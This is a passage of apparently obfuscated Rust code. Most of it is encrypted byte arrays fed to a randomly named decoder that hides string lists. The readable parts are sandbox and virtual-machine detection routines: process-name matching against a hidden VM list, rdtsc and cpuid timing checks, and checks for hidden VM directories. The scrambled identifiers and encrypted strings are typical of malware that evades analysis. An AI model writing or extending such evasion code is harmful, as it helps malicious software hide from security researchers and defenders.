, 52 , 254 , 100 , 19 , 211 , 54 , 23 , 13 , 138 , 223 , 221 , 122 , 254 , 83 , 117 , 195 , 189 , 218 , 186 , 58 , 210 , 83 , 86 , 116 , 187 , 177 , 216 , 63 , 226 , 238 , 62 , 229 , 213 , 175 , 225 , 215 , 113 , 84 , 12 , 162 , 62 , 6 , 191 , 33 , 87 , 120 , 162 , 109 , 100 , 129 , 66 , 136 , 47 , 253 , 133 , 73 , 52 , 42 , 12 , 34 , 245 , 225 , 116 , 150 , 172 , 95 , 254 , 176 , 78 , 98 , 150 , 220 , 227 , 155 , 136 , 65 , 247 , 182 , 47 , 238 , 115 , 1 , 13 , 23 , 252 , 161 , 62 , 181 , 4 , 16 , 199 , 44 , 120 , 63 , 35 , 195 , 150 , 133 , 166 , 104 , 45 , 34 , 78 , 76 , 193 , 36 , 255 , 84 , 37 , 43 , 60 , 84 , 245 , 76 , 18 , 86 , 100 , 241] , & [250 , 13 , 104 , 84 , 195 , 247 , 29 , 224 , 189 , 203 , 166 , 104 , 244 , 170 , 174 , 73 , 63 , 136 , 145 , 234 , 104 , 133 , 107 , 211 , 241 , 100 , 132 , 247 , 23 , 198 , 176 , 71 , 117 , 14 , 12 , 185 , 134 , 73 , 254 , 35 , 136 , 13 , 155 , 110 , 159 , 167 , 115 , 138 , 227 , 18 , 109 , 245 , 234 , 159 , 158 , 181 , 174 , 116 , 43 , 47 , 67 , 105 , 178 , 90 , 221 , 134 , 187 , 10 , 101 , 4 , 28 , 143 , 162 , 5 , 207 , 72 , 20 , 141 , 45 , 120 , 185 , 196 , 24 , 222 , 55 , 72 , 243 , 180] , 36283883717865u64) , decode_bpcz_gftyzfrr (& [142 , 153 , 204 , 153 , 37 , 99 , 94 , 22 , 221 , 231 , 186 , 65 , 207 , 202 , 155 , 155 , 15 , 54 , 161 , 8 , 255 , 58 , 227 , 60 , 143 , 91 , 28 , 82 , 145 , 88 , 108 , 180 , 188 , 254 , 58 , 218 , 66 , 20 , 110 , 174 , 238 , 95 , 37 , 136 , 8 , 215 , 173 , 41 , 231 , 23 , 237 , 53 , 30 , 255 , 65 , 166 , 109 , 183 , 49 , 223 , 209 , 229 , 244 , 216 , 133 , 237 , 52 , 10 , 255 , 34 , 182 , 107 , 141 , 176 , 96 , 35 , 180 , 237 , 10 , 147 , 15 , 1 , 34 , 148 , 187 , 48 , 187 , 164 , 40 , 254 , 69 , 15 , 137 , 142 , 245 , 152 , 176 , 50 , 84 , 12 , 129 , 126 , 160 , 75 , 133 , 167 , 31 , 141 , 193 , 106 , 112 , 200 , 9 , 214 , 44 , 5 , 35 , 53 , 226 , 44 , 45 , 198 , 217 , 62 , 173 , 203 , 138 , 158 , 37 , 89 , 207 , 242 , 77 , 21 , 63 , 249 , 26 , 24 , 148 , 162 , 247 , 156 , 247 , 106 , 227 , 56 , 207 , 18 , 109 , 9 , 62 , 61 , 22 , 110 , 134 , 204 , 1 , 192 , 131 , 6 , 105 , 78 , 249 , 9 , 49 , 91 , 39 , 152 , 62 , 12 , 71 , 77 , 143 , 141 , 90 , 68 , 58 , 17 , 212 , 178 , 15 , 194 , 236 , 62 , 221 , 197 , 7 , 242 , 159 , 74 , 47 , 217 , 42 , 108 , 113 , 129 , 113 , 23 , 227 , 236 , 124 , 11 , 43 , 179 , 179 , 154 , 13 , 152] , & [223 , 203 , 179 , 213 , 145 , 150 , 1 , 227 , 129 , 60 , 188 , 206 , 215 , 98 , 99 , 150 , 51 , 34 , 1 , 10 , 116 , 175 , 43 , 68 , 34 , 183 , 111 , 74 , 237 , 69 , 152 , 185 , 59 , 90 , 71 , 39 , 214 , 249 , 228 , 124 , 22 , 19 , 164 , 45 , 16 , 80 , 196 , 153 , 212 , 67 , 10 , 101 , 253 , 123 , 238 , 172 , 251 , 56 , 13 , 130 , 128 , 140 , 183 , 218 , 188 , 133 , 75 , 163 , 24 , 142 , 181 , 174 , 202 , 96 , 107 , 15 , 65 , 68 , 60 , 3 , 239 , 184 , 151 , 254 , 195 , 23 , 155 , 245] , 64866891073172u64) , decode_bpcz_gftyzfrr (& [94 , 206 , 160 , 207 , 220 , 111 , 77 , 197 , 80 , 39 , 157 , 122 , 56 , 53 , 252 , 83 , 103 , 166 , 231 , 223 , 130 , 230 , 151 , 123 , 145 , 135 , 203 , 251 , 76 , 229 , 52 , 52 , 88 , 7 , 221 , 255 , 168 , 41 , 175 , 87 , 187 , 131 , 176 , 93 , 215 , 101 , 236 , 220 , 25 , 124 , 47 , 60 , 96 , 225 , 11 , 186 , 250 , 239 , 29 , 39 , 198 , 76 , 127 , 30 , 174 , 122 , 93 , 158 , 169 , 149 , 96 , 10 , 60 , 230 , 90 , 157 , 96 , 221 , 138 , 76 , 193 , 98 , 140 , 32 , 8 , 236 , 19 , 165 , 223 , 164 , 141 , 184 , 81 , 24 , 131 , 209 , 72 , 90 , 41 , 69 , 212 , 215 , 210 , 202 , 223 , 114 , 160 , 214 , 143 , 239 , 147 , 117 , 163 , 133 , 252 , 188 , 135 , 99 , 109 , 124 , 35 , 132 , 199 , 71 , 238 , 83 , 222 , 25 , 98 , 188 , 140 , 182 , 183 , 81 , 45 , 241 , 164 , 38 , 112 , 240 , 145 , 100 , 24 , 129 , 243 , 196 , 230 , 103 , 125 , 122 , 213 , 82 , 255 , 49 , 172 , 103 , 105 , 15 , 190 , 82 , 158 , 163 , 229 , 16 , 16 , 115 , 133 , 114 , 106 , 46 , 229 , 183 , 137 , 97 , 55 , 92 , 229 , 87 , 186 , 145 , 210 , 221 , 246 , 76 , 200 , 115 , 96 , 50 , 141 , 233 , 47 , 103] , & [128 , 149 , 251 , 197 , 214 , 250 , 67 , 245 , 213 , 163 , 225 , 7 , 179 , 41 , 164 , 194 , 174 , 184 , 216 , 215 , 101 , 20 , 111 , 37 , 143 , 115 , 11 , 101 , 209 , 234 , 254 , 26 , 219 , 77 , 153 , 118 , 123 , 116 , 32 , 113 , 128 , 56 , 142 , 20 , 37 , 112 , 251 , 167 , 151 , 44 , 163 , 252 , 173 , 25 , 27 , 73 , 40 , 252 , 142 , 220 , 222 , 86 , 106 , 60 , 34 , 180 , 221 , 233 , 40 , 187 , 16 , 153 , 185 , 21 , 252 , 139 , 102 , 77 , 70 , 47 , 223 , 226 , 191 , 155 , 202 , 211 , 146 , 88] , 44014824850787u64) , decode_bpcz_gftyzfrr (& [97 , 18 , 182 , 217 , 238 , 246 , 145 , 194 , 250 , 132 , 94 , 86 , 215 , 217 , 17 , 31 , 167 , 249 , 25 , 255 , 78 , 255 , 107 , 119 , 252 , 42 , 177 , 63 , 36 , 250 , 232 , 50 , 76 , 173 , 148 , 227 , 62 , 157 , 97 , 19 , 210 , 253 , 238 , 213 , 17 , 168 , 151 , 93 , 251 , 236 , 27 , 161 , 88 , 239 , 33 , 181 , 146 , 63 , 102 , 7 , 85 , 132 , 194 , 155 , 48 , 50 , 216 , 61 , 149 , 152 , 31 , 145 , 182 , 160 , 178 , 7 , 12 , 192 , 246 , 226 , 113 , 242 , 255 , 1 , 116 , 77 , 120 , 131 , 155 , 72 , 218 , 88 , 23 , 129 , 120 , 169 , 137 , 2 , 104 , 180 , 86 , 254 , 51 , 104 , 46 , 214 , 106 , 66 , 135 , 94 , 103 , 96 , 113 , 65 , 202 , 21 , 188 , 15 , 227 , 216 , 33 , 176 , 100 , 36 , 10 , 138 , 169 , 69 , 97 , 104 , 52 , 49 , 164 , 250 , 40 , 164 , 145 , 88 , 51 , 237 , 9 , 221 , 13 , 55 , 100 , 150 , 105 , 51 , 214 , 42 , 67 , 8 , 204 , 186 , 13 , 243 , 196 , 24 , 66 , 29 , 202 , 119 , 1 , 221 , 126 , 63 , 215 , 200 , 220 , 109 , 180 , 248 , 170 , 227 , 37 , 115 , 40 , 35 , 235 , 170 , 66 , 37 , 84 , 79 , 153 , 162 , 208 , 188 , 0 , 251 , 167 , 78] , & [234 , 95 , 29 , 44 , 228 , 92 , 173 , 203 , 35 , 197 , 206 , 37 , 196 , 217 , 236 , 206 , 209 , 176 , 84 , 70 , 65 , 22 , 7 , 28 , 226 , 117 , 223 , 20 , 190 , 239 , 169 , 231 , 204 , 179 , 23 , 153 , 247 , 109 , 189 , 177 , 77 , 242 , 201 , 141 , 83 , 137 , 101 , 112 , 35 , 160 , 80 , 56 , 241 , 5 , 155 , 241 , 193 , 125 , 131 , 47 , 14 , 149 , 59 , 225 , 252 , 89 , 73 , 227 , 155 , 235 , 56 , 0 , 109 , 2 , 129 , 63 , 252 , 153 , 69 , 57 , 84 , 91 , 69 , 120 , 53 , 153 , 222 , 175] , 50109383443905u64) , decode_bpcz_gftyzfrr (& [129 , 0 , 194 , 134 , 218 , 251 , 37 , 47 , 251 , 12 , 86 , 100 , 193 , 63 , 21 , 97 , 38 , 244 , 46 , 117 , 179 , 29 , 6 , 233 , 120 , 33 , 10 , 59 , 196 , 49 , 213 , 51 , 181 , 153 , 185 , 177 , 164 , 206 , 12 , 37 , 194 , 253 , 99 , 219 , 250 , 199 , 103 , 143 , 114 , 21 , 137 , 33 , 239 , 118 , 105 , 188 , 78 , 117 , 187 , 243 , 49 , 105 , 11 , 218 , 42 , 27 , 234 , 193 , 76 , 66 , 67 , 27 , 58 , 140 , 106 , 112 , 194 , 238 , 66 , 214 , 219 , 27 , 195 , 149 , 31 , 37 , 18 , 182 , 197 , 18 , 58 , 8 , 144 , 201 , 130 , 23 , 145 , 60 , 174 , 125 , 248 , 252 , 219 , 161 , 26 , 32 , 252 , 212 , 78 , 72 , 80 , 149 , 103 , 118 , 221 , 92 , 6 , 111 , 252 , 106 , 23 , 30 , 87 , 57 , 144 , 45 , 118 , 198 , 56 , 166 , 99 , 59 , 243 , 161 , 242 , 68 , 157 , 156 , 146 , 103 , 156 , 32 , 132 , 0 , 8 , 77 , 115 , 43 , 232 , 96 , 13 , 170 , 227 , 99 , 12 , 206 , 27 , 235 , 238 , 83] , & [90 , 119 , 22 , 108 , 229 , 144 , 171 , 127 , 57 , 110 , 203 , 169 , 155 , 7 , 34 , 230 , 165 , 134 , 148 , 239 , 133 , 240 , 93 , 53 , 44 , 248 , 159 , 75 , 172 , 132 , 140 , 86 , 142 , 118 , 81 , 43 , 230 , 133 , 77 , 61 , 238 , 105 , 41 , 77 , 104 , 131 , 133 , 68 , 30 , 218 , 208 , 144 , 203 , 195 , 184 , 187 , 95 , 246 , 3 , 249 , 210 , 178 , 37 , 119 , 45 , 16 , 189 , 15 , 140 , 99 , 3 , 115 , 243 , 33 , 188 , 197 , 66 , 250 , 169 , 213 , 17 , 104 , 182 , 170 , 105 , 26 , 87 , 46] , 31976031519888u64) , decode_bpcz_gftyzfrr (& [242 , 247 , 123 , 128 , 124 , 117 , 252 , 228 , 13 , 243 , 26 , 85 , 2 , 17 , 52 , 211 , 104 , 75 , 112 , 219 , 147 , 23 , 214 , 89 , 65 , 150 , 47 , 18 , 139 , 178 , 62 , 3 , 157 , 232 , 249 , 214 , 91 , 244 , 7 , 75 , 55 , 87 , 197 , 124 , 211 , 1 , 189 , 65 , 88 , 38 , 147 , 176 , 165 , 200 , 126 , 14 , 158 , 169 , 218 , 66 , 17 , 10 , 86 , 188 , 221 , 13 , 11 , 241 , 139 , 212 , 205 , 219 , 225 , 189 , 156 , 149 , 204 , 227 , 13 , 100 , 234 , 32 , 215 , 251 , 145 , 152 , 174 , 162 , 19 , 36 , 35 , 106 , 191 , 185 , 42 , 104 , 241 , 117 , 37 , 186 , 246 , 80 , 148 , 24 , 122 , 217 , 218 , 85 , 243 , 123 , 139 , 129 , 246 , 187 , 183 , 16 , 6 , 88 , 119 , 109 , 202 , 116 , 251 , 127 , 177 , 62 , 130 , 52 , 237 , 130 , 129 , 187 , 138 , 95 , 1 , 94 , 157 , 68 , 121 , 57 , 173 , 122 , 7 , 74] , & [42 , 207 , 144 , 92 , 71 , 150 , 1 , 0 , 84 , 110 , 216 , 69 , 49 , 43 , 12 , 83 , 13 , 87 , 248 , 16 , 110 , 47 , 133 , 212 , 168 , 113 , 88 , 2 , 12 , 0 , 54 , 177 , 92 , 62 , 183 , 139 , 100 , 81 , 32 , 242 , 158 , 27 , 79 , 228 , 197 , 13 , 191 , 71 , 125 , 196 , 197 , 119 , 55 , 23 , 161 , 154 , 13 , 82 , 153 , 78 , 225 , 119 , 134 , 55 , 19 , 255 , 44 , 0 , 88 , 217 , 141 , 100 , 234 , 123 , 41 , 220 , 120 , 108 , 169 , 51 , 97 , 102 , 88 , 10 , 74 , 254 , 208 , 202] , 27603754812446u64) , decode_bpcz_gftyzfrr (& [88 , 167 , 14 , 62 , 21 , 168 , 31 , 49 , 101 , 101 , 50 , 202 , 37 , 51 , 77 , 52 , 10 , 20 , 194 , 240 , 49 , 33 , 214 , 98 , 148 , 205 , 77 , 231 , 134 , 153 , 103 , 253 , 204 , 134 , 75 , 229 , 33 , 168 , 59 , 151 , 170 , 34 , 211 , 127 , 174 , 186 , 168 , 9 , 29 , 11 , 131 , 159 , 76 , 16 , 233 , 138 , 16 , 154 , 59 , 29 , 201 , 160 , 88 , 244 , 207 , 92 , 244 , 253 , 80 , 104 , 226 , 218 , 232 , 105 , 216 , 63 , 184 , 140 , 59 , 201 , 88 , 26 , 143 , 233 , 247 , 234 , 167 , 15 , 1 , 6 , 127 , 112 , 236 , 88 , 205 , 136 , 3 , 45 , 162 , 181 , 219 , 184 , 219 , 253 , 190 , 241 , 212 , 204 , 33 , 130 , 85 , 152 , 37 , 23 , 240 , 174 , 225 , 87 , 64 , 7 , 30 , 9 , 48 , 217 , 162 , 149 , 179 , 21 , 148 , 63 , 84 , 240 , 36 , 53 , 153 , 5 , 193 , 2 , 251 , 24 , 96 , 61 , 179 , 49 , 101 , 191 , 133 , 130 , 58 , 72 , 6 , 137 , 94 , 26 , 111 , 220 , 142 , 224 , 128 , 170 , 123 , 233 , 72 , 97 , 152 , 198 , 24 , 143 , 212 , 181 , 149 , 13 , 100 , 93 , 55 , 128 , 5 , 161 , 4 , 153 , 169 , 89 , 35 , 97 , 12 , 39 , 110 , 112 , 98 , 174 , 254 , 3 , 159 , 146 , 77 , 11 , 255 , 22 , 143 , 150 , 206 , 33 , 55 , 141 , 85 , 93 , 156 , 203 , 174 , 236 , 246 , 12 , 19 , 97 , 219 , 118 , 244 , 174 , 23 , 168 , 131 , 196 , 220 , 37 , 49 , 28 , 227 , 136 , 243 , 106 , 117 , 95 , 21 , 115 , 49 , 191 , 147 , 161 , 244 , 101 , 231 , 147 , 80 , 141 , 201 , 122 , 181 , 120 , 4 , 144 , 158 , 26 , 165 , 248 , 217 , 232] , & [122 , 217 , 118 , 107 , 56 , 238 , 78 , 11 , 117 , 131 , 66 , 13 , 229 , 134 , 54 , 110 , 33 , 64 , 67 , 90 , 220 , 128 , 191 , 230 , 190 , 54 , 76 , 143 , 85 , 69 , 177 , 106 , 167 , 23 , 140 , 13 , 226 , 11 , 191 , 23 , 79 , 141 , 16 , 250 , 243 , 210 , 56 , 47 , 40 , 220 , 3 , 97 , 76 , 86 , 82 , 246 , 126 , 47 , 33 , 9 , 1 , 7 , 104 , 46 , 97 , 218 , 122 , 207 , 20 , 192 , 106 , 229 , 244 , 163 , 232 , 176 , 34 , 152 , 158 , 108 , 124 , 32 , 152 , 143 , 102 , 97 , 238 , 206] , 106867376261279u64) ,] ; loop { let exe_file_slice = { let len = process_entry . szExeFile . iter () . position (| & c | c == 0) . unwrap_or (process_entry . szExeFile . len ()) ; & process_entry . szExeFile [.. len] } ; let process_name = String :: from_utf16_lossy (exe_file_slice) ; for vm_process in & vm_processes { if process_name . eq_ignore_ascii_case (& * * vm_process) { unsafe { let _ = CloseHandle (snapshot_handle) ; } ; return true ; } } if unsafe { Process32NextW (snapshot_handle , & mut process_entry) } . is_err () { break ; } } unsafe { let _ = CloseHandle (snapshot_handle) ; } ; false } # [cfg (any (target_arch = "x86" , target_arch = "x86_64"))] pub fn check_rdtsc_timing () -> bool {  const umxwgccr : u32 = 10 ; const dlr_r_boiy : u64 = (44 + 956) ; let mut total_diff : u64 = 0 ; for _ in 0 .. umxwgccr { let t1 = unsafe { _rdtsc () } ; let t2 = unsafe { _rdtsc () } ; let diff = t2 - t1 ; total_diff += diff ; } let avg_diff = total_diff / umxwgccr as u64 ; avg_diff > dlr_r_boiy } # [cfg (not (any (target_arch = "x86" , target_arch = "x86_64")))] pub fn check_rdtsc_timing () -> bool { false } # [cfg (any (target_arch = "x86" , target_arch = "x86_64"))] pub fn check_cpuid_timing () -> bool {   const umxwgccr : u32 = 10 ; const dlr_r_boiy : u64 = (168 + 232) ; let mut total_diff : u64 = 0 ; for _ in 0 .. umxwgccr { let t1 = unsafe { _rdtsc () } ; let _cpuid = CpuId :: new () ; let t2 = unsafe { _rdtsc () } ; let diff = t2 - t1 ; total_diff += diff ; } let avg_diff = total_diff / umxwgccr as u64 ; avg_diff > dlr_r_boiy } # [cfg (not (any (target_arch = "x86" , target_arch = "x86_64")))] pub fn check_cpuid_timing () -> bool { false } pub fn check_filesystem_artifacts () -> bool { let vm_dirs = [decode_bpcz_gftyzfrr (& [25 , 22 , 103 , 230 , 221 , 70 , 172 , 125 , 181 , 121 , 98 , 137 , 177 , 216 , 9 , 29 , 227 , 86 , 240 , 119 , 37 , 162 , 236 , 54 , 118 , 176 , 214 , 253 , 121 , 188 , 182 , 186 , 21 , 151 , 111 , 196 , 62 , 16 , 206 , 83 , 91 , 74 , 5 , 99 , 19 , 29 , 74 , 180 , 82 , 26 , 50 , 90 , 190 , 20 , 65 , 213 , 55 , 89 , 201 , 33 , 143 , 84 , 72 , 232 , 10 , 228 , 16 , 220 , 161 , 67 , 184 , 248 , 228 , 239 , 172 , 193 , 215 , 212 , 241 , 120 , 238 , 199 , 207 , 76 , 60 , 194 , 246 , 185 , 54 , 202 , 240 , 6 , 252 , 48 , 148 , 32 , 39 , 207 , 39 , 240 , 78 , 249 , 26 , 78 , 15 , 163 , 220 , 201 , 83 , 11 , 62 , 167 , 120 , 63 , 49 , 52 , 56 , 7 , 34 , 252 , 249 , 150 , 20 , 98 , 231 , 120 , 51 , 210 , 94 , 246 , 159 , 41 , 91 , 7 , 216 , 39 , 144 , 27 , 208 , 11 , 195 , 185 , 27 , 103 , 31 , 2 , 154 , 71 , 208 , 173 , 210 , 212 , 62 , 2 , 68 , 27 , 253 , 247 , 148 , 36 , 241 , 37 , 23 , 14 , 160 , 12 , 102 , 122 , 199 , 250 , 8 , 117 , 93 , 248 , 57 , 218 , 206 , 10 , 23 , 225 , 23 , 56 , 12 , 32 , 71 , 142 , 151 , 203 , 242 , 111 , 94 , 75 , 155 , 65 , 194 , 87 , 77 , 156 , 74 , 142 , 80 , 82 , 95 , 203 , 140 , 1 , 108 , 227 , 89 , 158 , 208 , 68 , 166 , 142 , 209 , 134 , 10 , 123 , 166 , 97 , 161 , 246 , 180 , 218 , 80 , 60 , 189 , 118 , 1 , 23 , 155 , 117 , 105 , 23 , 123 , 9 , 38 , 147 , 143 , 151 , 149 , 161 , 9 , 144 , 124 , 203 , 23 , 85 , 9 , 130 , 134 , 208 , 114 , 54 , 250 , 161 , 91 , 182 , 252 , 179 , 110 , 252 , 145 , 74 , 151 , 236 , 222 , 232 , 174 , 70 , 75 , 163] , & [77 , 97 , 153 , 13 , 145 , 143 , 194 , 174 , 183 , 161 , 101 , 104 , 225 , 0 , 133 , 23 , 246 , 106 , 75 , 168 , 5 , 94 , 27 , 19 , 178 , 18 , 44 , 252 , 248 , 152 , 183 , 242 , 229 , 130 , 146 , 212 , 122 , 16 , 238 , 43 , 55 , 168 , 110 , 228 , 9 , 124 , 35 , 180 , 204 , 116 , 114 , 184 , 7 , 17 , 248 , 218 , 30 , 162 , 217 , 10 , 250 , 117 , 6 , 173 , 38 , 206 , 133 , 8 , 63 , 191 , 186 , 147 , 241 , 65 , 209 , 150 , 17 , 170 , 65 , 252 , 153 , 99 , 178 , 206 , 86 , 55 , 31 , 213] , 107601815668851u64) , decode_bpcz_gftyzfrr (& [51 , 22 , 231 , 237 , 249 , 52 , 151 , 240 , 135 , 154 , 26 , 115 , 246 , 89 , 208 , 123 , 96 , 49 , 208 , 13 , 172 , 140 , 36 , 126 , 108 , 48 , 113 , 226 , 28 , 135 , 49 , 14 , 158 , 3 , 144 , 141 , 177 , 8 , 178 , 206 , 4 , 121 , 208 , 215 , 30 , 245 , 33 , 35 , 239 , 219 , 163 , 120 , 204 , 183 , 187 , 185 , 180 , 127 , 93 , 133 , 122 , 44 , 183 , 224 , 190 , 156 , 29 , 178 , 177 , 106 , 209 , 17 , 23 , 123 , 19 , 129 , 197 , 218 , 91 , 12 , 179 , 54 , 121 , 66 , 143 , 171 , 116 , 75 , 84 , 5 , 165 , 0 , 19 , 102 , 145 , 67 , 63 , 229 , 24 , 62 , 112 , 240 , 97 , 24 , 20 , 230 , 32 , 193 , 203 , 34 , 104 , 32 , 117 , 241 , 197 , 99 , 195 , 10 , 123 , 183 , 250 , 115 , 81 , 99 , 93 , 168 , 162 , 169 , 69 , 70 , 13 , 60 , 173 , 135 , 48 , 159 , 167 , 134 , 31 , 120 , 134 , 157 , 213 , 190 , 118 , 155 , 44 , 241 , 28 , 240 , 3 , 48 , 219 , 148 , 152 , 54 , 205 , 85 , 130 , 49 , 201 , 75 , 114 , 193 , 146 , 49 , 229 , 61 , 73 , 13 , 102 , 196 , 117 , 62 , 140 , 106 , 158 , 64 , 237 , 92 , 231 , 50 , 51 , 123 , 244 , 121 , 225 , 33 , 45 , 158 , 8 , 81 , 220 , 246 , 85 , 36 , 201 , 151 , 125 , 85 , 254 , 19 , 43 , 183 , 57 , 182 , 69 , 104 , 71 , 250 , 137 , 191 , 141 , 108 , 7 , 179 , 88 , 238 , 75 , 86 , 185 , 224 , 169 , 7 , 22 , 113 , 78 , 0 , 50 , 137 , 19 , 204 , 181 , 178 , 79 , 202 , 243 , 89 , 72 , 129 , 245 , 6 , 65 , 243 , 203 , 60 , 233 , 61 , 177 , 163 , 74 , 66 , 138 , 143 , 162 , 10 , 79 , 57 , 25 , 135 , 139 , 5 , 147 , 218 , 163 , 9 , 238 , 181 , 187 , 118 , 214 , 39] , & [81 , 101 , 244 , 233 , 220 , 221 , 157 , 230 , 248 , 161 , 108 , 188 , 146 , 235 , 152 , 121 , 120 , 112 , 101 , 9 , 183 , 191 , 227 , 69 , 199 , 24 , 205 , 9 , 220 , 79 , 137 , 50 , 61 , 176 , 36 , 250 , 5 , 52 , 124 , 125 , 131 , 105 , 135 , 97 , 175 , 77 , 180 , 95 , 53 , 201 , 241 , 222 , 49 , 144 , 50 , 114 , 216 , 162 , 217 , 42 , 70 , 55 , 241 , 246 , 35 , 147 , 141 , 162 , 103 , 223 , 169 , 202 , 17 , 12 , 34 , 185 , 121 , 50 , 34 , 95 , 231 , 238 , 1 , 116 , 132 , 181 , 210 , 153] , 107812269066359u64) , decode_bpcz_gftyzfrr (& [158 , 177 , 89 , 205 , 184 , 56 , 12 , 158 , 26 , 215 , 184 , 11 , 28 , 255 , 158 , 194 , 217 , 74 , 173 , 58 , 119 , 11 , 74 , 57 , 252 , 191 , 106 , 162 , 55 , 47 , 186 , 179 , 182 , 109 , 209 , 123 , 122 , 46 , 19 , 104 , 165 , 33 , 148 , 50 , 229 , 110 , 134 , 240 , 73 , 136 , 4 , 169 , 57 , 134 , 133 , 158 , 160 , 170 , 153 , 70 , 136 , 19 , 29 , 121 , 147 , 157 , 34 , 238 , 205 , 87 , 140 , 48 , 58 , 198 , 202 , 159 , 173 , 97 , 84 , 71 , 107 , 159 , 120 , 56 , 249 , 207 , 23 , 110 , 73 , 48 , 209 , 53 , 11 , 175 , 66 , 35 , 212 , 18 , 41 , 35 , 105 , 255 , 10 , 214 , 164 , 99 , 205 , 233 , 178 , 69 , 217 , 62 , 144 , 174 , 168 , 244 , 65 , 106 , 149 , 33 , 35 , 218 , 186 , 101 , 118 , 177 , 56 , 103 , 250 , 123 , 224 , 215 , 156 , 116 , 86 , 120 , 217 , 115 , 95 , 13 , 148 , 166 , 46 , 82 , 131 , 216 , 248 , 201 , 50 , 95 , 21 , 23 , 124 , 195 , 114 , 126 , 143 , 153 , 198 , 166 , 17 , 71 , 104 , 47 , 195 , 64 , 106 , 45 , 160 , 73 , 79 , 206 , 55 , 160 , 42 , 75 , 178 , 236 , 137 , 123 , 232 , 122 , 17 , 216 , 163 , 62 , 134 , 111 , 10 , 0 , 3 , 176 , 220 , 17 , 96 , 62 , 176 , 190 , 205 , 126 , 240 , 189 , 197 , 51 , 238 , 235 , 63 , 165 , 21 , 122 , 186 , 196 , 86 , 213 , 167 , 67 , 11 , 175 , 218 , 228 , 210 , 137 , 34 , 7 , 8 , 189 , 115 , 27 , 105 , 50 , 177 , 68 , 1 , 194 , 251 , 196 , 74 , 160 , 66 , 17 , 62 , 106 , 175 , 87 , 215 , 47 , 97 , 59 , 171 , 150 , 147 , 218 , 241 , 255 , 6 , 52 , 33 , 35 , 21 , 165 , 107 , 236 , 136 , 176 , 175 , 71 , 117 , 199 , 53 , 82 , 83 , 188 , 135 , 138 , 156 , 63 , 81 , 29 , 182 , 43 , 115 , 24 , 113 , 195 , 45 , 19 , 157 , 167 , 177 , 234 , 51 , 84 , 75 , 33 , 137 , 16 , 219 , 198 , 227 , 161 , 27 , 75 , 207 , 75 , 227 , 246 , 59 , 182 , 71 , 28 , 158 , 185 , 170 , 7 , 69 , 15 , 112 , 104 , 106 , 255 , 176 , 73 , 43 , 157 , 53 , 224 , 218 , 223 , 65 , 141 , 94 , 42 , 80 , 132 , 167 , 10] , & [100 , 14 , 117 , 141 , 97 , 2 , 18 , 218 , 114 , 41 , 100 , 209 , 31 , 207 , 51 , 87 , 219 , 135 , 36 , 63 , 8 , 110 , 59 , 167 , 85 , 31 , 50 , 251 , 198 , 198 , 22 , 118 , 115 , 209 , 240 , 206 , 16 , 214 , 0 , 34 , 69 , 7 , 146 , 53 , 26 , 97 , 249 , 169 , 82 , 197 , 8 , 177 , 129 , 224 , 73 , 120 , 19 , 110 , 219 , 253 , 157 , 162 , 176 , 59 , 176 , 4 , 106 , 198 , 143 , 225 , 165 , 77 , 189 , 107 , 145 , 150 , 78 , 224 , 201 , 114 , 176 , 61 , 216 , 33 , 224 , 90 , 175 , 195] , 150409754708529u64) , decode_bpcz_gftyzfrr (& [46 , 166 , 192 , 41 , 97 , 159 , 98 , 201 , 23 , 162 , 11 , 181 , 64 , 144 , 199 , 55 , 157 , 118 , 121 , 75 , 57 , 227 , 152 , 191 , 231 , 77 , 122 , 248 , 203 , 237 , 240 , 129 , 122 , 67 , 13 , 185 , 81 , 246 , 172 , 53 , 197 , 159 , 226 , 82 , 5 , 207 , 0 , 108 , 234 , 236 , 120 , 209 , 249 , 179 , 156 , 52 , 3 , 207 , 111 , 11 , 84 , 110 , 163 , 162 , 92 , 162 , 78 , 213 , 228 , 185 , 113 , 225 , 180 , 209 , 229 , 198 , 66 , 241 , 81 , 218 , 63 , 202 , 134 , 243 , 193 , 82 , 158 , 171 , 78 , 12 , 79 , 218 , 83 , 105 , 239 , 54 , 2 , 228 , 223 , 199 , 61 , 225 , 86 , 50 , 127 , 74 , 5 , 86 , 222 , 234 , 179 , 65 , 142 , 147 , 7 , 47 , 162 , 82 , 84 , 75 , 93 , 60 , 87 , 235 , 201 , 149 , 250 , 206 , 18 , 95 , 131 , 156 , 119 , 16 , 102 , 248 , 12 , 118 , 198 , 98 , 146 , 60 , 211 , 51 , 45 , 116 , 132 , 24 , 25 , 248 , 199 , 38 , 188 , 182 , 205 , 243 , 95 , 56 , 92 , 97 , 28 , 237 , 248 , 78 , 248 , 214 , 40 , 166 , 186 , 172 , 33 , 166 , 71 , 19 , 185 , 149 , 14 , 187 , 67 , 35 , 163 , 199 , 235 , 168 , 91 , 239 , 242 , 240 , 151 , 112 , 10 , 14 , 23 , 253 , 123 , 166 , 162 , 101 , 179 , 169 , 184 , 174 , 192 , 242 , 56 , 247 , 218 , 64 , 149 , 74 , 60 , 1 , 148 , 39 , 170 , 49 , 217 , 99 , 146 , 7 , 246 , 68 , 247 , 113 , 87 , 52 , 1 , 196 , 127 , 105 , 41 , 194 , 34 , 216 , 205 , 214 , 11 , 199 , 50 , 147 , 146 , 198 , 205 , 243 , 51 , 107 , 177 , 164 , 140 , 9 , 112 , 78 , 12 , 141 , 48 , 96 , 22 , 87 , 250 , 209 , 8 , 156 , 236 , 132 , 61 , 123 , 61 , 47 , 21 , 166 , 80 , 177 , 140 , 12 , 82 , 174 , 124 , 27 , 173 , 59 , 235 , 1 , 62 , 119 , 235 , 30 , 13 , 113 , 180 , 143 , 44 , 98 , 39 , 87 , 199 , 37 , 219 , 149 , 247 , 121 , 115 , 127 , 23 , 12 , 224 , 92 , 139 , 113 , 178 , 11 , 137 , 55 , 88 , 91 , 13 , 43 , 250 , 30 , 251 , 16] , & [85 , 148 , 87 , 237 , 225 , 4 , 178 , 122 , 29 , 175 , 104 , 2 , 52 , 217 , 55 , 150 , 22 , 76 , 105 , 100 , 65 , 52 , 242 , 29 , 162 , 56 , 164 , 92 , 48 , 187 , 126 , 71 , 185 , 211 , 39 , 57 , 129 , 233 , 138 , 131 , 59 , 103 , 64 , 66 , 60 , 212 , 95 , 102 , 84 , 117 , 32 , 155 , 166 , 80 , 127 , 251 , 75 , 43 , 82 , 201 , 117 , 30 , 86 , 145 , 16 , 133 , 66 , 218 , 229 , 70 , 208 , 230 , 145 , 219 , 247 , 150 , 172 , 255 , 60 , 118 , 62 , 210 , 157 , 26 , 233 , 207 , 107 , 152] , 138491220462017u64) , decode_bpcz_gftyzfrr (& [183 , 85 , 96 , 130 , 199 , 88 , 123 , 237 , 14 , 110 , 201 , 165 , 195 , 30 , 247 , 